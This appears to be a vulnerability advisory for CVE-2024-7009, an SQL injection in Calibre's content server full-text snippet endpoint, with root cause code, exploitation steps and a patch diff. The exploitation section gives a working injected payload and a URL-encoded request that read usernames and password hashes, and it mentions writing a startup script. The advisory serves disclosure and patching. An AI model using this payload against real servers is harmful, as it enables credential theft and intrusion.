1. Detailed Summary  
   • CVE Identifier: CVE-2024-7009  
   • Vulnerability Type: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command – SQL Injection)  
   • Affected Software and Version: Calibre content server, all versions up to and including 7.15.0  

   Calibre’s content server exposes a full-text search endpoint (/fts/snippets/{book_ids}) that accepts user-supplied parameters:  
     – query (the search term)  
     – use_stemming  
     – highlight_start  
     – highlight_end  
     – snippet_size  
     – restrict_to_book_ids  
   The implementation passed highlight_start and highlight_end directly into an SQL FTS snippet/highlight expression via Python f-strings, without escaping single quotes or using parameterized queries. A low-privileged user who can perform full-text searches can maliciously craft those parameters to inject arbitrary SQL into the underlying SQLite query.  

2. Root Cause Analysis  
   Tracing the call flow:  

   a) In src/calibre/srv/fts.py, the endpoint definition accepts highlight_start and highlight_end from the request:  
   ```python
   @endpoint('/fts/snippets/{book_ids}', postprocess=json)
   def fts_snippets(ctx, rd, book_ids):
       # …
       for x in db.fts_search(
           query,
           use_stemming=use_stemming,
           return_text=True,
           highlight_start=rd.query.get('highlight_start','\x1c'),
           highlight_end=rd.query.get('highlight_end','\x1e'),
           restrict_to_book_ids=bids,
           snippet_size=ssz,
       ):
           # …
   ```
   b) In src/calibre/db/fts/connect.py, the search method builds part of its SQL dynamically:  
   ```python
   if return_text:
       if highlight_start is not None and highlight_end is not None:
           if snippet_size is not None:
               # [1] vulnerable string interpolation here
               text = f'''snippet(
                   "{fts_table}", 0,
                   '{highlight_start}',
                   '{highlight_end}',
                   '…',
                   {max(1, min(snippet_size, 64))}
               )'''
           else:
               text = f'''highlight(
                   "{fts_table}", 0,
                   '{highlight_start}',
                   '{highlight_end}'
               )'''
       text = ', ' + text
   … 
   query = (
       'SELECT {0}.id, {0}.book, {0}.format{1} FROM {0} '
       'JOIN {fts_table} ON fts_db.books_text.id = {fts_table}.rowid '
       'WHERE "{fts_table}" MATCH ?'
   ).format('books_text', text, fts_table=fts_table)
   ```
   At marker [1], highlight_start and highlight_end are embedded directly inside single quotes. An attacker who includes a single quote in those values can break out of the snippet() argument list and append arbitrary SQL statements (e.g., ATTACH, SELECT, DROP TABLE, etc.). No escaping or parameter binding is performed on these two parameters.  

3. Exploitation Details  
   A non-privileged user with permission to run full-text searches can exploit this as follows:  
   1. Choose a small valid book_ids set, e.g. `/fts/snippets/1`.  
   2. Supply the required parameters (`library_id`, `query`, `query_id`, `highlight_start`, `highlight_end`, `snippet_size`) in the query string or POST body.  
   3. Craft `highlight_end` to terminate the snippet call and inject extra SQLite commands. For example, to attach and read the server’s user database:  
      – On Windows, the content-server user database typically lives at  
        `%AppData%\calibre\server-users.sqlite`.  
      – Inject:  
        ```
        highlight_end=','',32) 
        FROM books_text 
        JOIN books_fts_stemmed ON fts_db.books_text.id = books_fts_stemmed.rowid 
        WHERE "books_fts_stemmed" MATCH ?;
        attach 'C:\Users\Bob\AppData\Roaming\calibre\server-users.sqlite' as suwu;
        select 1,1,name,pw from suwu.users;-- -
        ```
   4. The full HTTP request (URL-encoded) might look like:  
      ```
      GET /fts/snippets/1?
        library_id=Calibre_Library
        &query=foo
        &query_id=1
        &highlight_start=\x1c
        &highlight_end=%27%2C%27%27%2C32%29%20FROM%20books_text%20JOIN%20books_fts_stemmed%20ON%20fts_db.books_text.id%20%3D%20books_fts_stemmed.rowid%20WHERE%20%22books_fts_stemmed%22%20MATCH%20%3F%3B%20attach%20%27C%3A%5CUsers%5CBob%5CAppData%5CRoaming%5Ccalibre%5Cserver-users.sqlite%27%20as%20suwu%3B%20select%201%2C1%2Cname%2Cpw%20from%20suwu.users%3B--%20-
        &snippet_size=32
      ```
   5. The server will execute the combined query, attach the user DB, and return the rows from `suwu.users` (usernames and hashed passwords).  

   It is also possible to leverage `ATTACH DATABASE` on a non-existent file to write arbitrary data (e.g., writing a batch script into `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`), though with more limited primitives.  

4. Patch Overview  
   The fix replaces the direct f-string interpolation of `highlight_start` and `highlight_end` with proper parameter placeholders (`?`) and builds a parameter list. Example diff from src/calibre/db/fts/connect.py:  
   ```diff
   -   if snippet_size is not None:
   -       text = f'''snippet("{fts_table}", 0,
   -                        '{highlight_start}',
   -                        '{highlight_end}',
   -                        '…',
   -                        {max(1, min(snippet_size, 64))})'''
   +   data = []
   +   if snippet_size is not None:
   +       text = f'''snippet("{fts_table}", 0, ?, ?, '…', {max(1, min(snippet_size, 64))})'''
   +       data.append(highlight_start)
   +       data.append(highlight_end)
   …  
   -   query, params = query, (fts_engine_query,)
   +   data.append(fts_engine_query)
   +   params = tuple(data)
   ```
   Similar changes are applied in the annotations and notes FTS backends. This ensures SQLite’s parameter binding safely escapes `highlight_start` and `highlight_end`, closing the SQL-injection vector.